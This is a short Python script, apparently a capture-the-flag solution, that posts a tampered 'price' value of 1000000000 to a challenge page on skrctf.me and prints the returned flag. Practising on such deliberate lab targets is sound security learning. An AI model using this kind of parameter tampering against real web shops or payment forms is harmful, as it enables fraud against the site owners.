# URL of the vulnerable website
url = "https://skrctf.me/ports/4097d6b8817699f0b6166f3c6aee4dc6/secret.php"

# Define the payload with manipulated price value
payload = {"price": "1000000000"}

# Send the POST request
response = requests.post(url, data=payload)

# Check if the request was successful and print the flag if available
if response.status_code == 200:
    print("Flag:", response.text)
else:
    print("Failed to retrieve the flag.")